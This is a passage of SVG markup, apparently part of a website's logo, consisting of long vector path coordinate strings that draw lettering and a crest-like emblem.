                d="M50.5478 58.3351L49.6171 62.4495H40.018L40.1649 61.911H41.8788L44.181 51.3314H42.3687L42.5642 50.7437H48.3433L48.1964 51.3314H46.3356L44.034 61.911H45.8948C47.1194 61.911 47.6087 61.9595 48.3925 61.2741C48.9802 60.7842 49.7148 59.7065 50.0578 58.3357H50.5478V58.3351ZM54.5146 62.7421C52.6539 62.7421 51.1355 61.1745 51.1355 59.1182C51.1355 56.3759 53.8292 54.1715 55.9347 54.1715C57.8447 54.1715 59.1184 55.9351 59.1184 57.649C59.1184 58.6775 58.7268 59.6574 58.1391 60.5874C57.0615 62.155 55.6408 62.7421 54.5146 62.7421ZM57.3553 56.3759C57.3553 55.4452 56.9638 54.662 55.9839 54.662C55.2493 54.662 54.5146 55.1028 54.1224 55.739C53.5839 56.6697 52.8493 58.9713 52.8493 60.2936C52.8493 61.6651 53.6823 62.1065 54.3677 62.1065C54.9062 62.1065 55.4939 61.8605 55.8369 61.4696C56.4246 60.7835 56.8168 59.5104 57.0615 58.4334C57.2084 57.649 57.3553 57.0613 57.3553 56.3759ZM63.7221 54.4168L63.3306 56.3759C64.0154 54.7106 65.4366 54.0737 66.6114 54.0737C67.4929 54.0737 68.3745 54.3676 68.3745 55.5921C68.3745 55.9351 68.3259 56.2284 68.2773 56.5228L67.2003 60.6366C67.0534 61.3712 67.102 61.1751 67.0534 61.3227C66.955 61.7641 67.2489 61.7641 67.445 61.7641C67.7394 61.7641 67.9835 61.5686 68.131 61.3712C68.621 60.7356 68.5712 60.8825 68.964 60.1473L69.5025 60.4411C69.1097 61.2741 68.3265 62.7427 66.8081 62.7427C66.0735 62.7427 65.4379 62.2528 65.4379 61.3712C65.4379 61.1266 65.4864 60.9311 65.535 60.6366L66.5149 56.3273C66.5635 56.0821 66.612 55.8374 66.6618 55.6413C66.7589 55.1028 66.2204 54.9067 65.926 54.9067C65.4373 54.9067 64.849 55.3475 64.2115 56.0329C63.2328 57.1105 62.7914 58.4328 62.5468 59.3143L61.8122 62.498H60.0485L61.8607 54.9553H60.2446L60.2938 54.4168H63.7221ZM79.5417 60.5389C78.9049 61.7634 78.1702 62.5952 76.9457 62.645C75.9658 62.6935 75.8195 61.9104 75.7697 61.4204V61.1745L75.624 61.37C75.2312 61.9583 74.3011 62.7415 73.1251 62.7415C71.8034 62.7415 70.2359 61.4683 70.2359 59.4114C70.2359 56.5216 72.8319 54.1217 74.8396 54.1217C76.0642 54.1217 76.6027 54.5132 76.8971 55.0038L77.8758 50.8408H76.0642L76.2597 50.3017H79.7858L77.4842 59.6069C77.2887 60.5383 77.1412 61.0768 77.1412 61.4198C77.1412 61.713 77.2395 61.8114 77.4842 61.7628C77.8758 61.713 78.0227 61.4683 78.3172 61.1259C78.4143 60.979 78.8557 60.3428 78.954 60.1959L79.5417 60.5389ZM75.1826 54.6614C74.6441 54.6614 73.9095 54.9067 73.3212 55.886C72.294 57.6982 71.9995 58.9713 71.9995 60.2936C71.9995 61.4696 72.5866 62.0567 73.3212 62.0567C73.6642 62.0567 74.1056 61.9595 74.5458 61.5182C75.3302 60.8321 75.624 60.0496 76.1134 58.482C77.1412 55.396 75.9166 54.6614 75.1826 54.6614ZM83.7047 62.645C81.8433 62.645 80.3243 61.1266 80.3243 59.069C80.3243 56.3267 83.0187 54.1223 85.1247 54.1223C87.0833 54.1223 88.3564 55.8362 88.3564 57.5992C88.3564 58.5791 87.9648 59.6076 87.3279 60.4885C86.2509 62.0567 84.8309 62.645 83.7047 62.645ZM86.5454 56.3267C86.5454 55.3475 86.1538 54.6129 85.1739 54.6129C84.4393 54.6129 83.7053 55.0536 83.3125 55.6899C82.774 56.5714 82.0394 58.9221 82.0394 60.1959C82.0394 61.6159 82.8724 62.056 83.5578 62.056C84.0963 62.056 84.684 61.7628 85.0264 61.37C85.6134 60.6839 86.0063 59.4606 86.2509 58.3344C86.4464 57.5998 86.5454 56.963 86.5454 56.3267ZM93.0099 54.4168L92.5686 56.3759C93.2546 54.7106 94.6746 54.0737 95.85 54.0737C96.7801 54.0737 97.6616 54.3676 97.6616 55.5921C97.6616 55.9351 97.5645 56.2284 97.5147 56.5228L96.4863 60.6366C96.3406 61.3712 96.3406 61.1751 96.3406 61.3227C96.2422 61.7641 96.4863 61.7641 96.6824 61.7641C96.9768 61.7641 97.2221 61.5686 97.4182 61.3712C97.9082 60.7356 97.8584 60.8825 98.2499 60.1473L98.7399 60.4411C98.3969 61.2741 97.6137 62.7427 96.0467 62.7427C95.3607 62.7427 94.7238 62.2528 94.7238 61.3712C94.7238 61.1266 94.7736 60.9311 94.8222 60.6366L95.7523 56.3273C95.8506 56.0821 95.8992 55.8374 95.8992 55.6413C95.9976 55.1028 95.5076 54.9067 95.1646 54.9067C94.7232 54.9067 94.1361 55.3475 93.4986 56.0329C92.52 57.1105 92.0786 58.4328 91.8339 59.3143L91.0495 62.498H89.3363L91.1479 54.9553H89.4832L89.5318 54.4168H93.0099ZM16.8523 50.6454H17.2439L17.2931 50.2046H17.6847L17.1947 51.0369C17.1947 51.1347 17.3416 51.0861 17.44 51.0861L17.4892 51.0369V51.4285C17.0976 51.5754 16.6568 51.4285 16.6568 51.4285V51.0369C16.706 51.0861 16.9021 51.1347 16.9507 51.0369L16.4607 50.2046H16.8523V50.6454ZM8.52635 57.5021C8.62409 57.649 8.67327 57.7959 8.72183 57.9429C8.86875 58.2859 9.01568 58.5797 9.21178 58.9221L8.57553 59.4613C8.91856 59.902 9.31014 60.2936 9.65254 60.735C10.681 59.9998 11.7094 59.2166 12.8363 58.6289C13.3262 58.3842 14.0116 58.5797 14.5501 58.3351C14.1094 58.6781 13.8647 59.1674 13.4725 59.5104C13.7178 59.8043 13.8155 60.1965 14.0116 60.5395C13.5217 60.5395 12.9832 60.5881 12.5424 60.4411C12.6402 60.6858 12.6402 61.3227 12.6893 61.6171C12.2486 61.4217 11.7586 61.3227 11.367 60.9803C11.4156 61.6171 11.1709 62.1077 10.9748 62.6462C10.6324 62.3517 10.3386 62.0579 10.1425 61.7149C9.94639 62.1563 9.50624 62.4993 9.21178 62.9394L8.57553 63.8708C8.72245 63.4779 8.77164 62.9892 8.77164 62.5478C7.54708 62.3524 6.17623 61.7647 5.68566 60.4903C5.58987 60.2403 5.54009 59.9749 5.53874 59.7072C5.88114 60.3932 6.61575 60.7842 7.3018 60.8831C6.22417 60.2463 5.39182 59.1195 5.29346 57.8464C5.63648 58.5324 6.37109 59.2178 7.05651 59.5117V59.4625C5.93032 58.3855 5.24428 57.0626 5.39182 55.495C5.60197 56.46 6.18224 57.304 7.00796 57.8457C6.07725 56.6212 5.39182 55.1034 5.93095 53.4873C5.97951 55.1514 7.10632 56.6206 8.52635 57.5021ZM28.7044 57.8937C29.5859 57.3552 30.1244 56.4245 30.3697 55.5429C30.4675 57.1105 29.782 58.4328 28.6558 59.5098C29.3904 59.216 30.0765 58.5791 30.4189 57.8937C30.3697 58.726 29.9781 59.4613 29.3904 60.0975C29.0966 60.392 28.7536 60.6846 28.4112 60.8819C28.7339 60.8286 29.0473 60.7295 29.3419 60.5874C29.7046 60.3716 30.0076 60.0686 30.2234 59.7059C30.1742 60.7344 29.3911 61.7136 28.4604 62.1058C27.9704 62.3013 27.4811 62.4489 26.942 62.546C26.942 62.9874 26.9911 63.4761 27.1381 63.8689C26.7465 63.232 26.2559 62.5945 25.7666 62.0075C25.6844 61.9218 25.6182 61.822 25.5711 61.713C25.375 62.056 25.0812 62.3499 24.7388 62.6443C24.5433 62.1058 24.298 61.6159 24.3472 60.9784C23.9556 61.37 23.4657 61.4198 23.0249 61.6153C23.0249 61.2237 23.0249 60.8309 23.1718 60.4878C22.6333 60.5862 22.0948 60.5376 21.7026 60.5376C21.8495 60.1946 21.9964 59.8024 22.2411 59.5086C21.8003 59.1655 21.5557 58.6762 21.1635 58.3332C21.6042 58.5287 22.2903 58.4309 22.7802 58.5779C23.3199 58.8757 23.843 59.2026 24.3472 59.5571L25.6695 60.4872L26.0125 60.7331H26.0617L27.1393 59.4594L26.5516 58.9694C26.7963 58.5287 26.9924 58.0387 27.1393 57.5494C28.5593 56.6187 29.7347 55.1987 29.7839 53.4842C30.3205 55.1022 29.6351 56.6698 28.7044 57.8937Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M8.42874 57.1106C8.03716 56.9145 7.69414 56.5229 7.44885 56.1799C7.49803 55.2498 7.7427 54.4168 8.1349 53.5845C7.9388 54.8084 8.1349 56.033 8.42874 57.1106ZM28.2638 56.2284C28.0185 56.5715 27.6761 56.9145 27.2845 57.1106C27.5783 56.033 27.7744 54.8084 27.5783 53.633C27.9828 54.4418 28.2161 55.3254 28.2638 56.2284ZM9.31027 55.886C9.40801 55.5922 9.50638 55.2983 9.70248 55.0045C9.70248 55.3475 9.6533 55.7391 9.8494 56.033C10.3879 55.9352 11.0248 55.8369 11.6125 55.9352C11.3186 56.033 10.9756 56.2782 10.8287 56.5715C10.7795 56.5223 10.7795 56.4245 10.7309 56.376C10.584 56.376 10.4371 56.4252 10.2902 56.4252L10.7309 56.8659C10.6817 57.1112 10.6332 57.4536 10.7309 57.6983C10.7801 57.0614 11.1225 56.4737 11.6616 56.1799C11.9555 56.033 12.2985 55.9352 12.5923 56.1307C12.7386 56.2776 12.7878 56.4737 12.7386 56.6698C12.7386 56.5715 12.6409 56.4737 12.5432 56.4245C12.1024 56.2776 11.7594 56.62 11.5147 56.963C11.4655 57.0122 11.3678 57.11 11.3678 57.2083C11.5633 57.3552 11.8086 57.3061 12.0532 57.2569C12.2493 57.2083 12.3962 57.1592 12.5923 57.0122C12.2493 57.5016 11.7102 57.6977 11.2701 57.8938L11.4164 58.139C11.3186 58.2368 11.2209 58.3351 11.1225 58.3843L10.8287 57.9927C10.4863 58.2374 10.1432 58.4335 9.8494 58.6788L10.0941 59.0212C9.99632 59.1189 9.89858 59.2173 9.80022 59.2173C8.96787 58.1397 8.331 56.5721 8.96787 55.2012L9.16397 54.9074C9.16335 55.2498 9.16335 55.5922 9.31027 55.886ZM26.1085 58.9714L25.913 59.2167C25.8153 59.2167 25.7169 59.1183 25.6192 59.0698C25.6684 58.9228 25.8153 58.8245 25.8645 58.6782C25.5706 58.4329 25.2276 58.2374 24.8852 57.9921L24.5907 58.3837H24.5422C24.4444 58.2853 24.3461 58.2368 24.2483 58.1876C24.2975 58.0899 24.3953 57.9921 24.4444 57.8938C24.2483 57.796 24.0522 57.7468 23.8567 57.5999C23.5629 57.5022 23.2691 57.3061 23.1221 57.0129C23.416 57.2575 23.9053 57.3553 24.3461 57.2575C24.3461 57.1598 24.2483 57.1112 24.2483 57.0129C24.003 56.6698 23.6115 56.376 23.1707 56.4252C23.073 56.4252 23.0238 56.5229 22.9752 56.6206V56.6698C22.926 56.5715 22.926 56.3268 23.0244 56.2291C23.1713 56.0336 23.416 56.0336 23.6606 56.0821C24.1998 56.1799 24.7383 56.6698 24.8852 57.209C24.9338 57.3559 24.9338 57.552 24.9829 57.7475C25.0807 57.4536 25.0315 57.0614 24.9829 56.8659C25.1299 56.719 25.2768 56.5721 25.4237 56.4743C25.2768 56.4252 25.1299 56.4252 24.9829 56.3766C24.9829 56.4258 24.9338 56.5235 24.8852 56.5721C24.7383 56.3274 24.4444 56.0336 24.1014 55.9844C24.6399 55.8375 25.3253 55.9352 25.8645 56.0821C26.0599 55.7883 26.0114 55.3961 25.9622 55.0537C26.2075 55.2983 26.3052 55.5922 26.403 55.9352C26.5499 55.5922 26.5984 55.2983 26.5499 54.9068C27.4308 56.1799 26.8923 57.8938 26.1085 58.9714Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M17.1463 47.8058H17.6362V47.4136H18.077V47.8058H18.5177V47.4136H18.9585V48.932L18.6647 49.1772V50.2549H19.497C19.5462 50.1565 19.6439 50.0588 19.7915 50.108H20.6238C20.5746 50.3532 20.4769 50.6465 20.2322 50.794C20.1653 50.8552 20.0783 50.89 19.9876 50.8917C20.183 51.0387 20.2322 51.2833 20.183 51.528C20.1339 51.6264 20.0853 51.7241 19.9876 51.7733C20.183 52.0671 20.2322 52.4593 19.9876 52.7525C20.4283 52.9978 19.9876 53.3402 20.0368 53.6833C20.1837 53.781 20.3306 53.8787 20.3798 54.0748C20.3798 54.2709 20.3306 54.4664 20.1837 54.5648C20.1345 54.614 20.0367 54.614 19.9882 54.614C19.9882 54.7609 20.1351 54.9078 20.282 55.0055C20.5759 55.201 21.0658 55.1525 21.4088 55.0055C21.5558 54.9078 21.7519 54.7117 21.8004 54.5156C21.8496 54.4179 21.8004 54.3201 21.7512 54.2218C21.6043 54.0257 21.3597 53.9765 21.1636 54.0257C21.0043 54.078 20.8667 54.1812 20.772 54.3195C20.6251 53.781 20.6742 53.0949 21.1636 52.7519C21.4088 52.6542 21.7512 52.6542 21.9965 52.8011C22.0457 52.8011 22.0943 52.8995 22.192 52.948C22.1428 52.1642 22.2412 51.3319 22.9758 50.8911C23.4166 50.6458 24.0528 50.695 24.4936 50.9889L24.788 51.2341C25.0564 51.2565 25.3254 51.1986 25.5608 51.0678C25.7963 50.937 25.9875 50.7392 26.1103 50.4995C26.2087 50.4012 26.2573 50.2057 26.2573 50.0588C26.5403 50.2673 26.753 50.5572 26.8668 50.8899C26.9806 51.2225 26.9901 51.582 26.8941 51.9202C26.8449 51.9688 26.8941 52.0179 26.9433 52.0665C27.4824 52.1649 27.874 51.8218 28.2656 51.4788C28.3148 52.3112 28.0203 53.1441 27.2371 53.5357C26.7964 53.7312 26.2087 53.6334 25.8171 53.3402C25.4255 53.0464 25.1802 52.6542 24.9848 52.2626C24.8378 52.0665 24.544 52.1157 24.2502 52.1649C23.8586 52.214 23.4664 52.5079 23.2703 52.8509C23.2217 52.9978 23.1725 53.0956 23.1725 53.2425C23.2217 53.2425 23.3194 53.1933 23.3686 53.1441C23.7117 52.9972 24.1524 53.0949 24.3971 53.3402C24.6424 53.5855 24.6909 53.9765 24.5926 54.2709C24.4948 54.614 24.1518 54.9564 23.858 55.0547C23.8088 54.7117 23.6127 54.5648 23.4172 54.5648C22.9272 54.4664 22.7311 54.9564 22.3887 55.201C22.0457 55.544 21.458 55.7887 21.5066 56.3278C21.5066 56.5725 21.6535 56.8178 21.8496 56.9641C21.9474 57.0133 22.0457 57.0618 22.1435 57.0618C21.5066 57.3071 20.6251 57.3557 20.0866 56.8663C19.9396 57.0618 20.1357 57.454 20.1843 57.5026C20.3312 57.7964 20.5273 58.0417 20.5273 58.3847C20.2335 58.0909 19.8911 57.9931 19.4503 58.0909C19.4503 58.0909 19.205 58.0909 18.0788 58.7769C17.785 58.9724 17.5403 59.0708 17.5403 59.0708C17.5403 59.0708 17.4426 59.0216 17.3934 59.0216C17.0504 58.7769 16.6588 58.5808 16.3158 58.4339C16.1894 58.3022 16.1192 58.1265 16.1203 57.944C16.1431 57.8489 16.1917 57.762 16.2608 57.6929C16.33 57.6238 16.4168 57.5752 16.5119 57.5524V57.454L16.2672 57.0624C16.0858 57.02 15.906 56.971 15.7281 56.9155C15.0912 57.2094 14.2097 57.3071 13.5243 57.0624C13.7689 57.0139 14.0142 56.867 14.112 56.6217C14.2097 56.377 14.2097 56.034 14.0142 55.8379C13.6712 55.4463 13.2304 55.2016 12.9372 54.7609C12.7411 54.614 12.4473 54.5156 12.2026 54.5654C12.1047 54.6059 12.0204 54.6736 11.9597 54.7604C11.8989 54.8472 11.8642 54.9495 11.8596 55.0553C11.468 54.9084 11.0758 54.4185 11.0758 53.9777C11.0758 53.6347 11.2227 53.39 11.468 53.1939C11.8104 53.047 12.2518 53.047 12.4964 53.2431C12.4964 52.9001 12.301 52.6062 12.0557 52.4101C11.7126 52.1655 11.1741 52.0186 10.7826 52.2147C10.4887 52.6554 10.2441 53.0962 9.80329 53.39C9.41109 53.6347 8.82402 53.6839 8.38264 53.4392C7.69721 53.0476 7.40337 52.2638 7.45192 51.4801C7.69721 51.6762 7.99043 51.9208 8.28427 52.0192C8.43119 52.0677 8.72504 52.1169 8.87196 51.97C8.77422 51.8231 8.72504 51.5292 8.72504 51.4315C8.77422 50.893 9.01888 50.3545 9.45964 50.0115C9.45964 50.5014 9.90041 50.9907 10.3412 51.1377C10.5373 51.1868 10.7328 51.236 10.9289 51.236C11.3204 50.8444 11.8104 50.6483 12.3489 50.7461C12.7897 50.8444 13.2304 51.236 13.3773 51.6282C13.5243 52.0198 13.5243 52.5097 13.5243 52.9505C13.7197 52.7052 14.0142 52.6075 14.3566 52.7052C14.6996 52.7544 14.8951 53.146 14.9443 53.4398C14.9935 53.7337 14.9935 54.0761 14.9443 54.3214C14.7974 54.1253 14.6019 53.9783 14.3074 54.0275C14.1605 54.0275 14.0136 54.0767 13.9158 54.2236C13.8175 54.3705 13.8667 54.6152 13.965 54.7621C14.3074 55.2029 14.9443 55.2521 15.4342 55.1537C15.5812 55.1045 15.6795 55.056 15.8258 55.0068C15.7281 55.1537 15.7281 55.3984 15.875 55.5453C16.365 56.0352 17.1973 55.9861 17.8335 55.8391C18.3265 55.6941 18.8027 55.4974 19.2542 55.2521C18.9112 55.6928 19.3526 56.1822 19.4503 56.6229C19.5966 56.3783 19.7933 56.133 19.8911 55.8391C19.9396 56.3291 20.2335 56.7698 20.7234 56.9168C20.9189 56.9659 21.1642 56.9659 21.4088 56.9168C21.2134 56.6721 21.115 56.3783 21.2134 56.0844C21.2619 55.6928 21.6541 55.4967 21.7033 55.1537C21.3117 55.3984 20.724 55.4961 20.2827 55.3006C19.9888 55.2029 19.7442 54.909 19.5966 54.6152C18.8134 55.2521 17.8335 55.5945 16.7074 55.4967C16.8051 55.2521 16.9526 55.056 17.0504 54.8113H16.6588L16.3158 55.4482C16.1819 55.3702 16.0784 55.2494 16.0219 55.1051C16.0219 54.9582 16.0705 54.7621 16.1682 54.6644C16.1197 54.6152 16.0219 54.6152 15.9727 54.6152C15.8689 54.5833 15.7744 54.5265 15.6975 54.4497C15.6207 54.3728 15.5638 54.2783 15.532 54.1744C15.532 53.9298 15.6789 53.6851 15.9242 53.6851C15.9242 53.5874 15.875 53.3913 15.9242 53.2935C15.9493 53.2224 15.9957 53.1607 16.0571 53.1169C16.1184 53.073 16.1918 53.049 16.2672 53.0483C16.2672 53.0483 16.2672 52.9991 16.3158 52.9991V52.656L15.7281 52.5091L15.1404 50.9907C15.1404 50.9907 15.5812 50.6969 15.7773 50.55C15.6303 50.4522 15.8265 50.3545 15.8265 50.2069L16.0711 49.9131C16.0226 49.6678 16.0711 49.4232 15.9734 49.2271C16.2187 49.3248 16.4141 49.5209 16.6594 49.5209L17.0024 49.4717V49.1779L16.7572 48.9326V47.4136H17.1487V47.8058H17.1463ZM17.8317 48.5398C17.4893 48.6867 17.5378 49.0297 17.5378 49.3721H18.1255C18.1255 49.1766 18.1741 49.0291 18.1255 48.8336C18.077 48.7359 17.9786 48.5398 17.8317 48.5398ZM16.2647 49.6666L16.3133 50.0096C16.2155 50.1565 16.068 50.2549 16.068 50.4504L16.3133 50.7934C16.3133 50.9403 16.2155 51.0872 16.1664 51.2341L16.4608 51.8218H16.7547L17.0485 52.1649L17.3424 51.8218H17.587L17.93 51.2341C17.8317 51.0872 17.7339 50.9403 17.7339 50.7934L18.0284 50.4504C17.9792 50.2549 17.8815 50.1565 17.7831 50.0096V49.6666L17.4893 49.8135C17.1867 49.7158 16.8611 49.7158 16.5586 49.8135L16.2647 49.6666ZM19.7417 50.352C19.6931 50.4006 19.6439 50.4497 19.5462 50.4989C19.3009 50.5481 18.9093 50.4497 18.6647 50.5481C18.5663 50.5973 18.5177 50.695 18.4685 50.7934C18.4685 50.8911 18.4194 51.038 18.5177 51.0872C18.7138 51.3811 19.1546 51.2833 19.4484 51.2833L19.5462 51.3811C19.5462 51.4302 19.497 51.4788 19.4484 51.4788H18.077C17.9792 51.6749 17.8317 51.8218 17.8317 52.0665H17.4401L17.0485 52.5564L16.6569 52.0665H16.2162V51.9202L15.8731 51.2341C15.9277 51.1058 15.9767 50.9751 16.0201 50.8426L15.9223 50.7442L15.4816 51.0872L15.9223 52.3118L16.3139 52.4095V52.3118H16.5592L16.51 53.1441C16.51 53.291 16.3637 53.1933 16.2653 53.2425C16.1184 53.3402 16.2162 53.5855 16.167 53.6833C16.2718 53.6073 16.3939 53.5586 16.5223 53.5416C16.6506 53.5245 16.7812 53.5396 16.9022 53.5855L17.1961 52.7525C17.7837 52.8017 18.4206 52.6548 18.8614 52.214C19.0083 52.5079 19.2044 52.7525 19.4491 52.9978V53.1447C19.4491 53.2917 19.3021 53.1447 19.2038 53.2431C19.106 53.2431 19.106 53.4386 19.106 53.537L19.3015 53.6839C19.4484 53.5861 19.6445 53.5861 19.7915 53.5861L19.9378 52.9984L19.6931 52.7046C19.7908 52.6554 19.8394 52.5577 19.8886 52.4599C19.9371 52.2147 19.8886 51.97 19.6931 51.7739C19.8886 51.6762 19.9378 51.5286 19.9378 51.3331C19.8892 50.8432 19.3015 51.0393 18.9585 50.9901C18.763 50.9901 18.763 50.7448 18.9585 50.7448C19.3015 50.7448 19.7423 50.794 20.0361 50.6471C20.183 50.5979 20.2808 50.4516 20.2808 50.3532H19.7417V50.352ZM9.31023 50.5967L9.26167 50.6458C8.96783 51.0866 8.96783 51.7235 9.26167 52.1642C9.16393 52.2134 9.11475 52.262 9.01639 52.3112C8.62481 52.4581 8.13486 52.3603 7.79184 52.1157C7.88958 52.5073 8.13486 52.948 8.52644 53.1927C8.86947 53.3396 9.26105 53.3396 9.55489 53.1435C10.2409 52.7519 10.3387 52.0659 10.7303 51.5274C10.1426 51.5274 9.55489 51.1358 9.31023 50.5967ZM26.3538 50.5967C26.1576 51.1843 25.57 51.5274 24.9823 51.5274C25.3247 52.0173 25.423 52.605 25.9615 53.0458C26.2554 53.2419 26.5978 53.3888 26.99 53.2419C27.4799 53.0949 27.8223 52.605 27.9207 52.1151C27.7738 52.2128 27.5783 52.3105 27.3822 52.3597C27.0392 52.4089 26.6962 52.3597 26.4515 52.1642C26.5007 52.1151 26.5007 52.0659 26.5499 52.0173C26.7453 51.5765 26.6962 50.9889 26.3538 50.5967ZM18.7624 52.5558L18.4194 52.8005C18.4194 52.8988 18.5171 52.9474 18.5663 52.9966C18.5663 53.0458 18.5663 53.1921 18.5171 53.1921C18.4679 53.2412 18.3216 53.1921 18.2724 53.2412C18.1741 53.2412 18.1255 53.339 18.1255 53.4367C18.2724 53.4367 18.4194 53.4367 18.5171 53.5836C18.6155 53.5345 18.7132 53.4367 18.8601 53.4853C18.8601 53.3384 18.8601 53.2406 18.9579 53.0937C18.9579 53.0445 19.0562 52.996 19.1048 52.996C18.9755 52.8617 18.8608 52.7141 18.7624 52.5558ZM18.2731 53.6826C18.1747 53.6334 17.9792 53.6334 17.8815 53.7312C18.1268 53.8781 18.1753 54.2211 18.4692 54.2703C18.5669 54.3195 18.6653 54.2703 18.7145 54.2211C18.5663 54.0742 18.4685 53.8289 18.2731 53.6826ZM17.4893 53.6826C17.3424 53.6334 17.244 53.6826 17.1463 53.7804L17.5378 54.1719C17.6848 54.2703 17.8809 54.3189 18.0278 54.2211C17.8317 54.025 17.6854 53.7804 17.4893 53.6826ZM18.6647 53.7312C18.8116 53.9273 18.9093 54.1228 19.1054 54.3189C19.1593 54.3432 19.2178 54.3558 19.2769 54.3558C19.3361 54.3558 19.3945 54.3432 19.4484 54.3189C19.3015 54.1228 19.2032 53.9273 19.0569 53.7804C18.9585 53.6826 18.7624 53.6826 18.6647 53.7312ZM16.8032 53.7804C16.6563 53.7312 16.5094 53.7312 16.4116 53.8289C16.6077 53.9758 16.7547 54.1719 16.9508 54.3189C17.0485 54.3681 17.2446 54.3189 17.3424 54.2697C17.1463 54.0742 16.9993 53.8781 16.8032 53.7804ZM19.3993 53.8781C19.5462 54.025 19.6445 54.2697 19.84 54.3681C19.9378 54.4172 20.0361 54.4172 20.0853 54.3189C20.1345 54.2697 20.1345 54.172 20.1345 54.0736C19.9869 53.8289 19.6439 53.7804 19.3993 53.8781ZM16.1178 53.9273C16.0686 53.8781 15.9709 53.9273 15.8725 53.9273C15.8233 53.9765 15.8233 54.0742 15.8233 54.1719C15.8725 54.2703 15.9217 54.3681 16.0194 54.3681C16.2149 54.4172 16.4602 54.4172 16.6071 54.3189C16.4608 54.1719 16.3139 53.9765 16.1178 53.9273ZM14.0117 55.2004C14.3547 55.6412 14.648 56.1797 14.4033 56.7188C14.3547 56.8165 14.3056 56.8657 14.257 56.9143C14.7955 56.9635 15.2363 56.8651 15.6285 56.6204C15.8731 56.7188 16.167 56.7673 16.4608 56.7673C16.7547 57.355 17.0485 57.8935 17.244 58.5304C17.2932 58.0896 17.244 57.5997 17.1463 57.1589C17.0971 57.0126 17.0485 56.8651 16.9993 56.7673C17.3909 56.7182 17.7831 56.5712 18.1261 56.4243C18.3708 56.2774 18.6647 56.1305 18.8608 55.8366C18.2245 56.2282 17.4893 56.4243 16.6569 56.4735C16.167 56.4735 15.6285 56.4735 15.3838 55.9836C15.2861 55.7875 15.433 55.5428 15.4816 55.3959C14.9916 55.5434 14.4033 55.4457 14.0117 55.2004ZM12.4448 58.4333L11.0733 59.364L9.751 60.2941H9.70244L9.01639 59.4617C9.11413 59.364 9.26167 59.2656 9.35941 59.1679L9.751 59.6087C9.99628 59.4617 10.2409 59.2656 10.4862 59.0702C10.437 58.9724 10.2901 58.8249 10.2409 58.7271L10.7309 58.3356L11.0247 58.7271C11.27 58.5317 11.5632 58.3847 11.8079 58.2372L11.7102 58.0417C11.8571 57.9433 12.004 57.8456 12.2001 57.7964L12.4448 58.4333ZM24.003 58.0411L23.9053 58.2366L24.6891 58.7265C24.7874 58.6288 24.8852 58.4818 24.9829 58.3841L25.4728 58.7265L25.2276 59.0695L25.9622 59.6572C26.1091 59.5103 26.2075 59.3634 26.3538 59.2165C26.4515 59.265 26.5984 59.3634 26.6962 59.4611V59.5103L25.9615 60.2935L24.1985 59.0695L23.2678 58.4818L23.5131 57.7958C23.7092 57.8456 23.8561 57.9433 24.003 58.0411ZM15.1871 60.9795L15.7748 60.0494L16.3631 60.9795H15.1871ZM20.4769 60.9795H19.3507C19.5116 60.6591 19.6914 60.3485 19.8892 60.0494C20.0847 60.3439 20.2808 60.6857 20.4769 60.9795ZM16.0686 62.9885C15.9709 63.184 15.9223 63.4772 15.8731 63.7716C15.9709 63.8202 16.1184 63.7716 16.2162 63.7231H16.2653V64.0163C16.167 63.9677 16.0692 63.9677 15.9223 63.9677C15.9223 64.1147 15.9709 64.2622 15.9223 64.4577H15.6285C15.6285 64.2622 15.6285 64.1147 15.6777 63.9677C15.5307 63.9677 15.3838 63.9677 15.2861 64.0163V63.7231C15.3838 63.7716 15.5307 63.8202 15.6777 63.7716C15.6777 63.4772 15.5799 63.2331 15.4816 62.9885C15.5799 62.8415 15.7268 62.6454 15.7754 62.4985C15.824 62.6454 15.9709 62.8409 16.0686 62.9885Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M20.5254 58.7267H21.1131C21.3086 59.0205 21.5539 59.3143 21.7985 59.5104C21.5047 59.9512 21.3578 60.4897 21.0154 60.9311H21.5539C21.6024 61.421 21.6516 61.911 21.8963 62.3026H18.664V64.6527H21.6516C21.5047 66.8073 19.8394 68.9134 17.831 69.6978C15.8233 68.9134 14.2072 66.8073 14.0603 64.6527H16.9987V62.3026H13.815C14.0603 61.911 14.1088 61.421 14.1088 60.9311H14.6473V60.8825C14.3043 60.4897 14.2066 60.0004 13.9127 59.5596C13.9127 59.5596 13.8635 59.5104 13.9127 59.5104C14.1509 59.2715 14.3641 59.0089 14.549 58.7267H16.2635C16.7042 58.9221 17.0958 59.1182 17.4874 59.4127C18.0751 59.1189 18.6142 58.7765 19.2013 58.4334C19.4951 58.3357 19.8873 58.2373 20.1805 58.4334C20.2808 58.5306 20.4277 58.6283 20.5254 58.7267ZM20.7215 59.7551H14.991V59.9506H15.5787L14.8926 61.078C14.9418 61.2249 15.0395 61.421 15.1864 61.5182C15.4317 61.7136 15.7741 61.7641 16.068 61.6651C16.3133 61.568 16.5579 61.3706 16.6557 61.078L16.0194 59.9506H17.4886V60.392H17.7825L17.3909 60.8819L17.8317 61.3221L18.2724 60.8819L17.8808 60.392H18.1747L18.2239 59.9506H19.6931C19.6931 59.9506 19.2523 60.735 19.007 61.078C19.0562 61.1751 19.1539 61.3227 19.2025 61.421C19.4478 61.7143 19.8388 61.7641 20.1818 61.6657C20.4271 61.6171 20.7209 61.3227 20.7695 61.0786L20.0834 59.9512H20.7203V59.7551H20.7215ZM16.9993 65.9756H14.6977C15.0401 67.1018 15.9223 68.2274 16.9993 68.9134V65.9756ZM18.6646 65.9756V68.9134C19.3507 68.4733 19.9377 67.885 20.4277 67.2002C20.673 66.8073 20.8684 66.4157 21.0154 65.9756H18.6646ZM26.2554 68.6202C26.2068 68.9775 26.2068 69.3398 26.2554 69.6972H26.0107C26.1084 69.4513 26.0599 69.1089 26.0599 68.8157C25.9621 69.0603 25.913 69.3056 25.8644 69.5503H25.6677C25.6677 69.3056 25.6185 69.1089 25.5208 68.9134V69.6493L25.5699 69.6978C25.4722 69.7464 25.3738 69.7464 25.3247 69.7464L25.3738 69.6493C25.3738 69.3548 25.3738 69.0124 25.3247 68.7179C25.423 68.6694 25.5208 68.6694 25.6677 68.6694C25.6677 68.8163 25.7654 69.0124 25.7654 69.1593C25.8146 69.0124 25.9123 68.8163 25.9123 68.6208H26.2554V68.6202ZM10.6325 68.8642V69.6972L10.6817 69.7943C10.5839 69.7943 10.4862 69.7458 10.3878 69.7458L10.437 69.6486C10.437 69.3056 10.4862 68.9626 10.3878 68.6687L10.6817 